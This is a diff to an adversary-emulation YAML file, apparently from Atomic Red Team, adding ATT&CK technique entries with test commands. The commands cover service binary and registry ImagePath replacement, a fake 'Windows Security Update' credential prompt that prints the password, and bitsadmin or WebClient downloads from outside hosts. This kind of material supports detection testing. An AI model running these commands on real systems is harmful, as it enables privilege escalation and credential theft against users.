@@ -1500,6 +1500,92 @@ persistence:
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           cmd.exe /k %APPDATA%\updater.exe
+  T1044:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      - User
+      x_mitre_data_sources:
+      - File monitoring
+      - Services
+      - Process command-line parameters
+      name: File System Permissions Weakness
+      description: |-
+        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
+
+        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+        ### Services
+
+        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.
+
+        ### Executable Installers
+
+        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)
+      id: attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.
+
+        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:43.063Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      - Administrator
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1044
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1044
+      - source_name: capec
+        external_id: CAPEC-17
+        url: https://capec.mitre.org/data/definitions/17.html
+      - source_name: Mozilla Firefox Installer DLL Hijack
+        description: Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory
+          2012-98. Retrieved March 10, 2017.
+        url: https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/
+      - source_name: Seclists Kanthak 7zip Installer
+        description: "Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL
+          (case 7): 7z*.exe\tallows remote code execution with escalation of privilege.
+          Retrieved March 10, 2017."
+        url: http://seclists.org/fulldisclosure/2015/Dec/34
+      modified: '2019-07-17T21:22:37.100Z'
+      identifier: T1044
+    atomic_tests:
+    - name: File System Permissions Weakness
+      description: "This test to show checking file system permissions weakness and
+        which can lead to privilege escalation by replacing malicious file. Example;
+        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
+        win32_service | select PathName\"   (check service file location) and \ncopy
+        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
+        \  ( replace weak permission file with malicious file )\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_permission_file:
+          description: check weak files permission
+          type: path
+          default: GoogleUpdate.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Get-WmiObject win32_service | select PathName
+          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
   T1158:
     technique:
       x_mitre_data_sources:
@@ -4187,6 +4273,92 @@ persistence:
           Disable-TransportAgent #{transport_agent_identity}
           Uninstall-TransportAgent #{transport_agent_identity}
           Get-TransportAgent
+  T1058:
+    technique:
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Services
+      - Windows Registry
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      name: Service Registry Permissions Weakness
+      description: |-
+        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)
+
+        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).
+
+        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)
+      id: attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      x_mitre_system_requirements:
+      - Ability to modify service values in the Registry
+      type: attack-pattern
+      x_mitre_detection: |-
+        Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.
+
+        Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Matthew Demaske, Adaptforward
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:49.119Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1058
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1058
+      - source_name: capec
+        external_id: CAPEC-478
+        url: https://capec.mitre.org/data/definitions/478.html
+      - source_name: MSDN Registry Key Security
+        description: Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved
+          March 16, 2017.
+        url: https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx
+      - description: 'Hull, D. (2014, May 3). Kansa: Service related collectors and
+          analysis. Retrieved October 10, 2019.'
+        source_name: TrustedSignal Service Failure
+        url: https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html
+      - source_name: Twitter Service Recovery Nov 2017
+        description: The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters.
+          Retrieved April 9, 2018.
+        url: https://twitter.com/r0wdy_/status/936365549553991680
+      - source_name: TechNet Autoruns
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+      modified: '2019-10-11T02:52:39.175Z'
+      identifier: T1058
+    atomic_tests:
+    - name: Service Registry Permissions Weakness
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service check
+          type: Registry
+          default: weakservicename
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
   T1166:
     technique:
       x_mitre_data_sources:
@@ -4298,6 +4470,73 @@ persistence:
         command: |
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+  T1023:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      name: Shortcut Modification
+      description: Shortcuts or symbolic links are ways of referencing other files
+        or programs that will be opened or executed when the shortcut is clicked or
+        executed by a system startup process. Adversaries could use shortcuts to execute
+        their tools for persistence. They may create a new shortcut as a means of
+        indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036)
+        to look like a legitimate program. Adversaries could also edit the target
+        path or entirely replace an existing shortcut so their tools will be executed
+        instead of the intended legitimate program.
+      id: attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Since a shortcut's target path likely will not change, modifications
+        to shortcut files that do not correlate with known software changes, patches,
+        removal, etc., may be suspicious. Analysis should attempt to relate shortcut
+        file change or creation events to other potentially suspicious events based
+        on known adversary behavior such as process launches of unknown executables
+        that make network connections.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:30.757Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      external_references:
+      - external_id: T1023
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1023
+      - source_name: capec
+        external_id: CAPEC-132
+        url: https://capec.mitre.org/data/definitions/132.html
+      modified: '2019-07-18T19:28:08.364Z'
+      identifier: T1023
+    atomic_tests:
+    - name: Shortcut Modification
+      description: "This test to simulate shortcut modification and then execute.
+        example shortcut (*.lnk , .url) strings check with powershell;  \ngci -path
+        \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String
+        -Pattern \"exe\" | FL \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        shortcut_file_path:
+          description: shortcut modified and execute
+          type: path
+          default: shortcutname.url
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe
+          >> #{shortcut_file_path} && #{shortcut_file_path}
+
+'
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -11243,6 +11482,102 @@ defense-evasion:
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
 '
+  T1102:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network protocol analysis
+      - Packet capture
+      - SSL/TLS inspection
+      name: Web Service
+      description: |-
+        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
+
+        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
+
+        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
+
+        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
+      modified: '2019-07-18T21:21:18.135Z'
+      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
+      x_mitre_network_requirements: true
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'Host data that can relate unknown or suspicious process
+        activity using a network connection is important to supplement any existing
+        indicators of compromise based on malware command and control signatures and
+        infrastructure or the presence of strong encryption. Packet capture analysis
+        will require SSL/TLS inspection if data is encrypted. Analyze network data
+        for uncommon data flows (e.g., a client sending significantly more data than
+        it receives from a server). User behavior monitoring may help to detect abnormal
+        patterns of activity. Analyze packet contents to detect communications that
+        do not follow the expected protocol behavior for the port that is being used.
+        (Citation: University of Birmingham C2)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Anastasios Pingios
+      created: '2017-05-31T21:31:13.915Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1102
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1102
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      x_mitre_defense_bypassed:
+      - Binary Analysis
+      - Log analysis
+      - Firewall
+      identifier: T1102
+    atomic_tests:
+    - name: Reach out to C2 Pointer URLs via command_prompt
+      description: 'Download data from a public website using command line
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/
+          %TEMP%\bitsadmindownload.html
+
+'
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+
+'
+    - name: Reach out to C2 Pointer URLs via powershell
+      description: 'Multiple download methods for files using powershell
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest -Uri www.twitter.com
+          $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
+          $wc = New-Object System.Net.WebClient
+          $T1102 = $wc.DownloadString("https://www.aol.com/")
+        cleanup_command: 'Clear-Variable T1102
+
+'
   T1220:
     technique:
       x_mitre_data_sources:
@@ -12425,6 +12760,92 @@ privilege-escalation:
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           cmd.exe /k %APPDATA%\updater.exe
+  T1044:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      - User
+      x_mitre_data_sources:
+      - File monitoring
+      - Services
+      - Process command-line parameters
+      name: File System Permissions Weakness
+      description: |-
+        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
+
+        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+        ### Services
+
+        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.
+
+        ### Executable Installers
+
+        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)
+      id: attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.
+
+        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:43.063Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      - Administrator
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1044
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1044
+      - source_name: capec
+        external_id: CAPEC-17
+        url: https://capec.mitre.org/data/definitions/17.html
+      - source_name: Mozilla Firefox Installer DLL Hijack
+        description: Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory
+          2012-98. Retrieved March 10, 2017.
+        url: https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/
+      - source_name: Seclists Kanthak 7zip Installer
+        description: "Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL
+          (case 7): 7z*.exe\tallows remote code execution with escalation of privilege.
+          Retrieved March 10, 2017."
+        url: http://seclists.org/fulldisclosure/2015/Dec/34
+      modified: '2019-07-17T21:22:37.100Z'
+      identifier: T1044
+    atomic_tests:
+    - name: File System Permissions Weakness
+      description: "This test to show checking file system permissions weakness and
+        which can lead to privilege escalation by replacing malicious file. Example;
+        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
+        win32_service | select PathName\"   (check service file location) and \ncopy
+        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
+        \  ( replace weak permission file with malicious file )\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_permission_file:
+          description: check weak files permission
+          type: path
+          default: GoogleUpdate.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Get-WmiObject win32_service | select PathName
+          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
   T1179:
     technique:
       x_mitre_data_sources:
@@ -13519,6 +13940,92 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+  T1058:
+    technique:
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Services
+      - Windows Registry
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      name: Service Registry Permissions Weakness
+      description: |-
+        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)
+
+        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).
+
+        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)
+      id: attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      x_mitre_system_requirements:
+      - Ability to modify service values in the Registry
+      type: attack-pattern
+      x_mitre_detection: |-
+        Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.
+
+        Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Matthew Demaske, Adaptforward
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:49.119Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1058
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1058
+      - source_name: capec
+        external_id: CAPEC-478
+        url: https://capec.mitre.org/data/definitions/478.html
+      - source_name: MSDN Registry Key Security
+        description: Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved
+          March 16, 2017.
+        url: https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx
+      - description: 'Hull, D. (2014, May 3). Kansa: Service related collectors and
+          analysis. Retrieved October 10, 2019.'
+        source_name: TrustedSignal Service Failure
+        url: https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html
+      - source_name: Twitter Service Recovery Nov 2017
+        description: The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters.
+          Retrieved April 9, 2018.
+        url: https://twitter.com/r0wdy_/status/936365549553991680
+      - source_name: TechNet Autoruns
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+      modified: '2019-10-11T02:52:39.175Z'
+      identifier: T1058
+    atomic_tests:
+    - name: Service Registry Permissions Weakness
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service check
+          type: Registry
+          default: weakservicename
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
   T1166:
     technique:
       x_mitre_data_sources:
@@ -18542,11 +19049,101 @@ credential-access:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows
-          Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);
-          echo $cred.GetNetworkCredential().Password;}
+        command: "# Creates GUI to prompt for password. Expect long pause before prompt
+          is available.    \n$cred = $host.UI.PromptForCredential('Windows Security
+          Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using
+          write-warning to allow message to show on console as echo and other similar
+          commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning
+          $cred.GetNetworkCredential().Password"
+  T1208:
+    technique:
+      x_mitre_data_sources:
+      - Windows event logs
+      x_mitre_permissions_required:
+      - User
+      name: Kerberoasting
+      description: |-
+        Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)
+
+        Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)
+
+        This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)
+
+        Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)
+      id: attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_system_requirements:
+      - Valid domain account or the ability to sniff traffic within a domain.
+      type: attack-pattern
+      x_mitre_detection: 'Enable Audit Kerberos Service Ticket Operations to log Kerberos
+        TGS service ticket requests. Particularly investigate irregular patterns of
+        activity (ex: accounts making numerous requests, Event ID 4769, within a small
+        time frame, especially if they also request RC4 encryption [Type 0x17]). (Citation:
+        Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking
+        Kerberos Dec 2015)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Praetorian
+      created: '2018-04-18T17:59:24.739Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: credential-access
+      external_references:
+      - external_id: T1208
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1208
+      - source_name: Microsoft Detecting Kerberoasting Feb 2018
+        description: Bani, M. (2018, February 23). Detecting Kerberoasting activity
+          using Azure Security Center. Retrieved March 23, 2018.
+        url: https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/
+      - source_name: Microsoft SPN
+        description: Microsoft. (n.d.). Service Principal Names. Retrieved March 22,
+          2018.
+        url: https://msdn.microsoft.com/library/ms677949.aspx
+      - source_name: Microsoft SetSPN
+        description: Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN
+          Syntax (Setspn.exe). Retrieved March 22, 2018.
+        url: https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx
+      - source_name: SANS Attacking Kerberos Nov 2014
+        description: Medin, T. (2014, November). Attacking Kerberos - Kicking the
+          Guard Dog of Hades. Retrieved March 22, 2018.
+      - source_name: Harmj0y Kerberoast Nov 2016
+        description: Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz.
+          Retrieved March 23, 2018.
+        url: https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
+      - source_name: Empire InvokeKerberoast Oct 2016
+        description: EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved
+          March 22, 2018.
+        url: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+      - source_name: AdSecurity Cracking Kerberos Dec 2015
+        description: Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets
+          Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory
+          Domain. Retrieved March 22, 2018.
+        url: https://adsecurity.org/?p=2293
+      modified: '2019-07-18T15:18:23.401Z'
+      identifier: T1208
+    atomic_tests:
+    - name: Request for service tickets
+      description: |
